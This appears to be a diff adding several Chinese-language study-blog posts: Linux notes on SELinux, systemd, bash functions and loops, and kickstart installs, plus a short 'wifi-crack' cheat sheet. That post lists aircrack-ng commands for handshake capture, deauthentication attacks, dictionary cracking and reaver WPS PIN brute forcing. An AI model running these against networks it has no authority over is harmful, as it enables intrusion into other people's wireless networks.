@@ -166,6 +166,544 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/26/wifi-crack/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="lcxiao">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lcxiao's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/06/26/wifi-crack/" class="post-title-link" itemprop="url">wifi-crack</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-06-27 07:33:06 / 修改时间：15:33:18" itemprop="dateCreated datePublished" datetime="2020-06-27T07:33:06+08:00">2020-06-27</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <ol>
+<li>使用airmon-ng命令检查网卡是否支持监听模式</li>
+</ol>
+<p><code>airmon-ng</code></p>
+<ol start="2">
+<li>开启无线网卡的监听模式</li>
+</ol>
+<p><code>airmon-ng start IFACE</code></p>
+<ol start="3">
+<li>扫描环境中的WiFi网络</li>
+</ol>
+<p><code>airodump IFACE</code></p>
+<ol start="4">
+<li>抓取握手包</li>
+</ol>
+<p><code>airodump-ng -c TARGET_CHANNEL --bssid TARGET_MAC -w CAP_FILE IFACE</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-c 指定信道，上面已经标记目标热点的信道</span><br><span class="line"></span><br><span class="line">-bssid指定目标路由器的BSSID，就是上面标记的BSSID</span><br><span class="line"></span><br><span class="line">-w指定抓取的数据包保存的目录</span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li>对无线路由器进行Deauth攻击</li>
+</ol>
+<p><code>aireplay-ng --deauth 1 -a TARGET_MAC -c DEVICE_MAC IFACE</code></p>
+<ol start="6">
+<li>进行破解WIFI密码（跑包）</li>
+</ol>
+<p><code>aircrack-ng -w WORDLIST CAP_FILE</code></p>
+<ol start="7">
+<li>pin破解</li>
+</ol>
+<p>wash -i IFACE</p>
+<p>reaver –bssid TARGET_MAC –channel TARGET_CHANNEL -i IFACE -A -v –no-nack</p>
+<p>aireplay-ng –fakeauth 100 -a TARGET_MAC -h IFACE_MAC IFACE</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/26/27-Selinux/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="lcxiao">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lcxiao's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/06/26/27-Selinux/" class="post-title-link" itemprop="url">27.Selinux</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-06-27 07:32:29 / 修改时间：15:32:42" itemprop="dateCreated datePublished" datetime="2020-06-27T07:32:29+08:00">2020-06-27</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>Selinux<br>    Secure Enhanced Linux</p>
+<p>工作于内核中<br>强制访问控制</p>
+<p>DAC：自主访问控制：</p>
+<p>MAC：强制访问控制：</p>
+<p>最小权限法则</p>
+<p>解决进程启动之后拥有属主所有权限的问题</p>
+<p>sandbox：沙箱机制</p>
+<p>任何进程启动之后，会处于一个我们提供的最小权限环境下，即使脱离控制，也不能随意造成破坏；</p>
+<p>不需要把所有进程都置入沙箱</p>
+<p>若果ps top 都被替换？</p>
+<p>通常别人能够访问到的服务进程应该纳入selinux</p>
+<p>SElinux2种工作级别：<br>    strict：每个进程都受到SElinux的控制：<br>    targeted：有限的进程受到SElinux的控制：只监控容易被入侵的进程；</p>
+<p>安全法则模型：<br>    subject：进程<br>    object：其他进程或文件<br>        文件：open、read、write、close、chown、chmod<br>    subject：domain 域<br>    object：type    类型</p>
+<p>ls -Z<br>ps auxZ</p>
+<p>SElinux为每个文件提供了安全标签，也为进程提供了安全标签；<br>user：role：type<br>    user：SElinux的user；<br>    role：角色<br>    type：类型</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/26/26-Systemd/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="lcxiao">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lcxiao's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/06/26/26-Systemd/" class="post-title-link" itemprop="url">26.Systemd</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-06-27 07:32:05 / 修改时间：15:32:17" itemprop="dateCreated datePublished" datetime="2020-06-27T07:32:05+08:00">2020-06-27</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>Systemd<br>POST–Bootsequeue –bootloader（MBR）–kernel–rootfs-init<br>centos5 ：Sysv<br>centos6 ：upstart<br>centos7 ：systemd</p>
+<p>新特性:<br>系统引导时实现服务并行启动；<br>按需激活进程<br>系统状态快照<br>基于依赖关系定义服务控制逻辑</p>
+<p>核心概念 unit<br>    由其相关配置文件进行标识、识别和配置；文件中主要包含了系统服务、监听的socket、保存的快照以及其他与init相关的信息；<br>    这些配置文件主要保存在<br>    /etc/systemd<br>    /lib/systemd/system<br>    /usr/lib/systemd/system<br>    /run/systemd/syetem</p>
+<p>unit的常见类型；<br>Service unit 文件扩展名是.service，用于定义系统服务<br>Target unit 文件扩展为.target 用于模拟实现“运行级别”<br>Device unit  .device 用于定义内核识别的设备<br>Mount unit .mount 定义文件系统挂载点 （用户组和名称空间）<br>Socket unit 。socket 用于标识进程间通信用到的socket文件；<br>Snapshot .snapshot 管理系统快照<br>Swap unit .swap 用于标识swap设备<br>Automount unit .automount 文件系统自动点设备<br>Path unit .path 用于定义文件系统中的文件或目录</p>
+<p>关键特性：<br>    基于socket的激活机制：socket与程序分离<br>    基于bus的激活机制；<br>    基于device的激活机制；<br>    基于path的激活机制；<br>    系统快照：保存各unit的当前状态信息于持久存储设备中；实现回滚<br>    向后兼容SYSV的init脚本<br>        /etc/init.d<br>    不兼容：<br>        systemctl 的命令是固定不变的；<br>        非由systemd启动的服务，systemctl无法与之通信，无法控制此服务；（自己写个unit）</p>
+<p>管理系统服务；<br>centos7 ：service类型的unit文件：<br> systemctl [OPTIONS…] COMMAND [NAME…]</p>
+<p>启动、停止、重启、状态：<br>service NAME start  ===》 systemctl start NAME<br>stop<br>restart<br>status<br>    loaded：表示已装载，被管理<br>    Active：inactive（停止dead）（disabled）（不自启）<br>    Active: active (running）（运行中）</p>
+<p>条件式重启：<br>    systemctl try-restart NAME</p>
+<p>重载或重启服务：<br>systemctl reload-or-try-restart NAME<br>reload-or-restart<br>reload-or-try-restart</p>
+<p>查看服务当前启动与否？<br>systemctl is-active NAME</p>
+<p>查看所有已激活的服务；<br>systemctl list-units </p>
+<p>systemctl list-units –type service<br>查看所有服务（已激活和未激活）<br>systemctl list-units -t service –all<br>chkconfig –list</p>
+<p>开机自启<br>chkconfig NAME on<br>systemctl enable NAME</p>
+<p>关闭自启<br>chkconfig NAME off<br>systemctl disable NAME</p>
+<p>查看某服务是否能开机自启<br>systemctl is-enabled NAME<br>chkconfig –list NAME</p>
+<p>禁止某服务设置为开机自启：<br>systemctl mask NAME</p>
+<p>取消此限制<br>systemctl unmask NAME</p>
+<p>查看服务的依赖关系：<br>systemctl list-dependencies NAME</p>
+<p>管理target units：<br>运行级别：<br>0 == runlevel0.target poweroff.target<br> systemctl poweroff</p>
+<p>1 == runlevel.target rescue.target</p>
+<p>2 == runlevel2.target  multi-user.target<br>3 == runlevel3.target   multi-user.target<br>4 == runlevel4.target   multi-user.target</p>
+<p>5 == runlevel5.target   graphical.target</p>
+<p>6 == runlevel6.target   reboot.target</p>
+<p>级别切换：<br>init N<br>systemctl isolate NAME.target</p>
+<p>查看级别：<br>runlevel<br>systemctl list-units -t target</p>
+<p>查看所有target<br>systemctl list-units -t target –all</p>
+<p>获取默认运行级别<br>systemctl get-default</p>
+<p>修改默认运行级别<br>systemctl set-default multi-user.target </p>
+<p>sysv：修改inittab文件</p>
+<p>切换至紧急救援模式：<br>systemctl rescue    会加载驱动以及1级别的</p>
+<p>切换至紧急模式：<br>systemctl emergency    各种设置及驱动都不会，最简洁的模式</p>
+<p>其他常见命令<br>    关机：systemctl halt ，systemctl poweroff<br>    重启：  systemctl reboot<br>    挂起：systemctl suspend<br>    快照：systemctl hibernate<br>    快照并挂起：systemctl hybrid-sleep、</p>
+<p>SERVICE unit 文件组成<br>通常三部分组成<br>[Unit] ：定义与unit类型无关的通用选项；用于提供unit的描述信息，unit行为以及依赖关系等；<br>[Service] :与特定类型相关的专用选项；此处为service类型；<br>[Install] ：定义由systemctl enable 以及 systemctl disable 命令在实现服务启用或禁用时用到的一些选项；</p>
+<p>Unit段的常用选项；<br>    Description：描述信息；意义性描述<br>    After：定义unit的启动次序；表示当前unit应该晚于哪些unit启动；其功能与Before相反；<br>    Requles ：依赖到的其他units，强依赖，被依赖的units无法激活时，当前unit无法激活<br>    Wants：依赖到的其他units；弱依赖；<br>    Conflicts：定义units之间的冲突关系；</p>
+<p>Service段常用选项：<br>    TYPE:  定义影响ExecStart及相关参数的功能的unit进程启动类型；<br>        类型：<br>            simple：父进程和子进程（nginx之类的）<br>            forklng：后续进程启动之后这个进程会退出<br>            oneshot：<br>            dbus：后续进程只有在主进程得到<br>            notify：类似于simple<br>            idle：类似simple<br>    Environment: 定义环境配置文件，在ExecStart之前启动，并为之提供一些自定义选项；<br>    ExecStart ：指明启动unit要运行的命令或脚本；ExecStartPre、ExecStartPost<br>    ExecReload<br>    ExecStop ：指明停止unit要运行的命令或脚本<br>    Restart：意外终止。。</p>
+<p>Install段：<br>    Alias：<br>    RequlredBy：被哪些unit所依赖<br>    WantedBy：被哪些units所依赖</p>
+<p>注意：对于新创建的unit文件，或修改了的unit文件，必须要通知systemd重载此配置文件；<br>systemctl daemon-reload</p>
+<p>练习：为当前系统的httpd服务提供一个unit文件</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/26/25-%E5%87%BD%E6%95%B0%E7%BC%96%E7%A8%8B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="lcxiao">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lcxiao's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/06/26/25-%E5%87%BD%E6%95%B0%E7%BC%96%E7%A8%8B/" class="post-title-link" itemprop="url">25.函数编程</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-06-27 07:31:41 / 修改时间：15:31:55" itemprop="dateCreated datePublished" datetime="2020-06-27T07:31:41+08:00">2020-06-27</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>多分支if语句<br>if ；then<br>elif ；then<br>。。。<br>else<br>fi</p>
+<p>case 语句：</p>
+<p>示例1：显示一个菜单给用户<br>cpu）display cpu information<br>mem)meminfo<br>disk) diskinfo<br>quit) quit</p>
+<p>要求：</p>
+<ol>
+<li>提示用户给出自己的选择</li>
+<li>正确的选择给出相应的信息；否则，提示重新选择正确的选项；</li>
+</ol>
+<p>case $VARAIBLE in<br>PAT1)<br>    分支1<br>    ;;<br>PAT2)<br>    分支2<br>    ;;<br>PAT3)<br>    …<br>    …<br>*)<br>    分支n<br>    ;;<br>esac</p>
+<p>示例：写一个服务框架脚本</p>
+<ol>
+<li>此脚本可接受start stop restart status 四个参数之一</li>
+<li>如果参数非4者，提示帮助后退出</li>
+<li>start，则创建lockfile，并显示启动完成；stop，删除lockfile，并显示停止；restart，先删除在创建，而后显示重启完成，status，判断文件是否存在，存在，显示running，不存在显示stopped；</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">#</span><br><span class="line">prog&#x3D;$(basename $0)</span><br><span class="line">lockfile&#x3D;&#x2F;var&#x2F;lock&#x2F;subsys&#x2F;$prog</span><br><span class="line"></span><br><span class="line">case $1 in</span><br><span class="line">start)</span><br><span class="line">    if [ -f $lockfile ]; then</span><br><span class="line">        echo &quot;$prog is Running.&quot;</span><br><span class="line">    else</span><br><span class="line">        touch $lockfile</span><br><span class="line">        [ $? -eq 0 ] &amp;&amp; echo &quot;start $prog finished.&quot;</span><br><span class="line">    fi  </span><br><span class="line">    ;;  </span><br><span class="line">stop)</span><br><span class="line">    if [ -f $lockfile ]; then</span><br><span class="line">        rm -f $lockfile</span><br><span class="line">        [ $? -eq 0 ] &amp;&amp; echo &quot;stop $prog finished.&quot;</span><br><span class="line">    else</span><br><span class="line">        echo &quot;$prog stopped.&quot;</span><br><span class="line">    fi  </span><br><span class="line">    ;;  </span><br><span class="line">restart)</span><br><span class="line">    if [ -f $lockfile ]; then</span><br><span class="line">        rm -f $lockfile</span><br><span class="line">        touch $lockfile</span><br><span class="line">        echo &quot;Restarting finished.&quot;</span><br><span class="line">    else</span><br><span class="line">        touch -f $lockfile</span><br><span class="line">        echo &quot;start $prog finished.&quot;</span><br><span class="line">    fi  </span><br><span class="line">    ;;  </span><br><span class="line">status)</span><br><span class="line">    if [ -f $lockfile ]; then</span><br><span class="line">        echo &quot;Running.&quot;</span><br><span class="line">    else</span><br><span class="line">        echo &quot;Stopped.&quot;</span><br><span class="line">    fi  </span><br><span class="line">    ;;</span><br><span class="line">*)</span><br><span class="line">    echo &quot;Usage:$0 start|stop|restart|status.&quot;</span><br><span class="line">    exit 1</span><br><span class="line">esac</span><br></pre></td></tr></table></figure>
+
+<p>函数：function<br>过程式编程：代码重用<br>模块化编程<br>结构化编程</p>
+<p>把一段独立功能的代码当做一个整体，并为之一个名字，命名的代码段，此即为函数；</p>
+<p>注意：定义函数的代码段不会自动执行，在调用时执行；所谓调用函数；在代码中给定函数名即可；<br>函数名出现的任何位置，在代码执行时；都会被自动替换为函数代码；</p>
+<p>语法1.<br>    function f_name{<br>        …函数体…<br>    }<br>语法2.<br>    f_name{<br>        …函数体…<br>    }</p>
+<p>函数的声明周期：每次被调用时创建，返回时终止；<br>其状态返回结果为函数体中运行的最后一条命令的状态结果；<br>自定义状态返回值，需要使用return；<br>retutn [0-255]<br>0：成功<br>255：失败</p>
+<p>示例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> 1 #!&#x2F;bin&#x2F;bash</span><br><span class="line"> 2 #</span><br><span class="line"> 3 username&#x3D;$1</span><br><span class="line"> 4 userinfo() &#123;</span><br><span class="line"> 5     if id &quot;$username&quot; &amp;&gt; &#x2F;dev&#x2F;null; then</span><br><span class="line"> 6         grep &quot;^$username\&gt;&quot; &#x2F;etc&#x2F;passwd | cut -d: -f3,7</span><br><span class="line"> 7     else</span><br><span class="line"> 8         echo &quot;No such user.&quot;</span><br><span class="line"> 9     fi</span><br><span class="line">10 &#125;</span><br><span class="line">11 </span><br><span class="line">12 username&#x3D;$1</span><br><span class="line">13 userinfo</span><br><span class="line">14 username&#x3D;$2</span><br><span class="line">15 userinfo</span><br></pre></td></tr></table></figure>
+<p> 函数返回值：<br> 函数的执行结果返回值；</p>
+<ol>
+<li>使用echo或printf命令进行输出；</li>
+<li>函数体中调用的命令的执行结果；</li>
+</ol>
+<p>函数的退出状态码：</p>
+<ol>
+<li>默认取决于函数体中执行的最后一条命令的退出状态码；</li>
+<li>自定义：return</li>
+</ol>
+<p>函数可以传递参数：<br>传递参数给函数：<br>    在函数体当中，可以使用$1,$2…引用传递给函数的参数；<br>    在调用函数时，在函数名后面以空白字符分隔给定参数列表即可，例如，testfunc arg1 arg2 arg3 …</p>
+<p>练习：写一个脚本：<br>使用函数实现ping一个主机来测试在线状态；主机地址通过参数传递给函数：、<br>测试172.16.1.1-172.16.67.1</p>
+<p>练习2：<br>打印NN乘法表</p>
+<p>变量作用域<br>局部变量：作用域是函数的声明周期；在函数结束时被自动销毁<br>定义局部变量的方法：local VARAIBLE=VALUE<br>本地变量：作用域是运行脚本的shell进程的生命周期；因此，其作用范围是当前脚本程序文件；</p>
+<p>函数递归：<br>    函数直接或者间接调用自身；<br>    10！=10<em>9！=10</em>9<em>8！=10</em>9<em>8</em>7！=…</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/26/24-%E5%BE%AA%E7%8E%AF%E7%9A%84%E9%AB%98%E7%BA%A7%E7%94%A8%E6%B3%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="lcxiao">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lcxiao's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/06/26/24-%E5%BE%AA%E7%8E%AF%E7%9A%84%E9%AB%98%E7%BA%A7%E7%94%A8%E6%B3%95/" class="post-title-link" itemprop="url">24.循环的高级用法</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-06-27 07:31:18 / 修改时间：15:31:30" itemprop="dateCreated datePublished" datetime="2020-06-27T07:31:18+08:00">2020-06-27</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>while<br>until<br>for</p>
+<p>for((i=0;i&lt;10;i++));do<br>循环体<br>done</p>
+<p>while read VARAIBLE；do<br>循环体<br>done &lt; /PATH/TO/SOMEFILE</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/26/23-anaconda%E9%85%8D%E7%BD%AE%E5%AE%9A%E5%88%B6%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%89%E8%A3%85Linux-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="lcxiao">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lcxiao's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/06/26/23-anaconda%E9%85%8D%E7%BD%AE%E5%AE%9A%E5%88%B6%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%89%E8%A3%85Linux-1/" class="post-title-link" itemprop="url">23.anaconda配置定制自动化安装Linux</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-06-27 07:30:47 / 修改时间：15:31:04" itemprop="dateCreated datePublished" datetime="2020-06-27T07:30:47+08:00">2020-06-27</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>安装操作系统的过程就是规划系统，把需要的功能和响应的文件放到合适的位置；<br>创建用户<br>init程序<br>可以自动化实现</p>
+<p>CentOS系统安装：<br>bootloader–kernel（initrd（rootfs））–anaconda<br>安装程序：anaconda<br>必须先启动内核：<br>提供一个界面。首先，创建一个bootloader（安装在光盘或者U盘）<br>之后加载设备上某个路径的kernel（vmlinuz）<br>之后借助于initrd（rootfs）直接内存作为根文件系统；<br>之后启动anaconda程序（作为sbin/init）用户空间的第一个程序</p>
+<p>anaconda两个界面<br>tui：基于cureses的文本配置窗口<br>gui：图形界面</p>
+<p>CentOS的安装过程启动流程：<br>MBR：boot.cat<br>stage2：isolinux/isolinux.bin<br>    配置文件：isolinux/isolinux.cfg</p>
+<p>每个对应的菜单选项：<br>    加载内核：isolinux/vmlinuz<br>    向内核传递参数：append initrd=initrd.img </p>
+<p>获取根文件系统，并启动anaconda<br>    默认界面是图形界面；至少需要512MB内存，否则无法使用图形界面<br>    如果需要显示指定启动tui接口，向启动内核传递一个参数“text”即可；</p>
+<pre><code>ESC：
+boot：linux text</code></pre><p>注意：上述内容一般位于引导设备（光盘或者U盘）或者是网络上；<br>anaconda启动之后剩余的过程，后续的anaconda及其安装用到的程序包等；<br>可以来自于程序包仓库，此仓库的位置可以为：</p>
+<ul>
+<li>本地光盘</li>
+<li>本地硬盘</li>
+<li>ftp服务器</li>
+<li>http服务器</li>
+<li>nfs服务器</li>
+</ul>
+<p>如要手动指明安装仓库：则按ESC键<br>    boot：linux method（询问用户，让用户选择安装方法）</p>
+<p>anaconda的工作过程：<br>安装前配置阶段<br>    安装过程使用的语言<br>    键盘类型<br>    安装目标存储设备<br>        Basic Storage：本地磁盘<br>        Special Storage：iscsi<br>    设定主机名<br>    配置网络接口<br>    时区<br>    管理员密码<br>    设定分区方式及MBR的安装位置；<br>    创建一个普通用户；<br>安装阶段<br>    在目标磁盘创建分区并执行格式化<br>    将选定的程序包安装至指定位置<br>    安装bootloader<br>首次启动<br>    iptables<br>    selinux<br>    core dump（核心转储，崩溃时，把内存数据备份下来）（可做分析用）（内存小于2G无法开启）</p>
+<p>anaconda配置方式<br>    1. 交互式配置方式<br>    2. 支持通过读取配置文件中实现定义好的配置项自动完成配置；遵循特定的语法格式，此文件即为kickstart文件；</p>
+<p>此文件可以放在本地文件服务器上；</p>
+<p>安装引导选项：<br>text：文本安装方式<br>method：手动指定使用的安装方法<br>与网路相关的引导选项：<br>    ip=IPADDR<br>    netmask=NETMASK<br>    gateway=GW<br>    dns=DNS_SERVER_IP<br>远程访问功能相关的引导选项：<br>    VNC<br>    vncpasswd=’password’<br>启动紧急救援模式：<br>    rescue<br>装载额外驱动：<br>    dd</p>
+<p><a href="http://www.redhat.com/docs" target="_blank" rel="noopener">www.redhat.com/docs</a> 《installation guide》</p>
+<h2 id="CentOS系统安装："><a href="#CentOS系统安装：" class="headerlink" title="CentOS系统安装："></a>CentOS系统安装：</h2><pre><code>ks：指明kickstart文件的位置
+ks=
+    DVD driver：ks=cdrom:PATH/TO/KICKSTART_FILE
+    Hard_Driver:ks=hd:/DEVICE/PATH/TO/KICKSTART_FILE
+    HTTP Server  ks=http://HOST[:PORT]/PATH/TO/KICKSTART_FILE
+    FTP Server ks=ftp://HOST[:PORT]/PATH/TO/KICKSTART_FILE
+    HTTPS Server: ks=https://HOST[:PORT]/PATH/TO/KICKSTART_FILE
+
+kickstart文件的格式
+    命令段  指定各种安装前配置选项，如键盘类型等；
+        必备命令
+        可选命令
+
+    程序包段    
+        指明要安装的程序包，以及包组，也包括不安装的程序包；
+        %packages 表示程序包段开始，中间的都表示程序包
+        @group_name 安装包组
+        package 安装
+        -package    不安装
+        %end        结束
+
+    脚本段
+        %pre 安装前脚本
+            运行环境：运行安装介质上的微型linux系统环境
+        %post 安装后脚本
+            运行环境：安装完成的系统</code></pre><h3 id="命令端中的选项"><a href="#命令端中的选项" class="headerlink" title="命令端中的选项"></a>命令端中的选项</h3><p>auth | authconfig   认证方式配置<br><code>auth --enableshadow --passalgo=sha512</code><br>bootloader  定义bootloader的安装位置及相关配置<br><code>bootloader --append=&quot; crashkernel=auto&quot; --location=mbr --boot-drive=sda</code><br>Keyboard layouts    设置键盘类型<br><code>keyboard --vckeymap=us --xlayouts=&#39;us&#39;</code><br>System language 语言类型<br><code>lang en_US.UTF-8</code><br>part    分区布局</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   </span><br><span class="line"># Disk partitioning information</span><br><span class="line">part &#x2F;boot --fstype&#x3D;&quot;xfs&quot; --ondisk&#x3D;sda --size&#x3D;1024</span><br><span class="line">part &#x2F; --fstype&#x3D;&quot;xfs&quot; --ondisk&#x3D;sda --size&#x3D;17404</span><br><span class="line">part swap --fstype&#x3D;&quot;swap&quot; --ondisk&#x3D;sda --size&#x3D;204</span><br></pre></td></tr></table></figure>
+<p> Partition clearing information 清空磁盘分区<br>    clearpart –none –initlabel</p>
+<p>volgroup：创建卷组<br>logvol：</p>
+<p>Root password       设置密码：<br>rootpw –iscrypted $6$TWt34GTGFsaxobTC$cR4TOgqr/2uf7RDAPFlPT6QgPbhoMZVNsKMAKpk3FduEsGB4F92Gx8Vivm.26QdEnnGlCUcbMWHQYqoA8QPnz.</p>
+<p>使用openssl手动生成一个：$ openssl passwd -1 -salt <code>openssl rand -hex 4</code></p>
+<p>System timezone 时区<br>timezone Asia/Shanghai –isUtc –nontp</p>
+<h3 id="可选命令："><a href="#可选命令：" class="headerlink" title="可选命令："></a>可选命令：</h3><p>install OR upgrade ：安装或升级<br>text ：安装界面类型 text为tui ，默认为GUI<br>network ：配置网络接口<br>    network –onboot=yes –device eth0 –bootproto dhcp –noipv6<br>firewall： 防火墙<br>    firewall –disable<br>selinux ：SELinux<br>    selinux –disable</p>
+<p>系统安装之后禁用防火墙：<br>    CentOS6：<br>        service iptables off<br>        chkconfig iptables off<br>    CentOS7：<br>        systemctl stop firewalld<br>        systemctl disable firewalls</p>
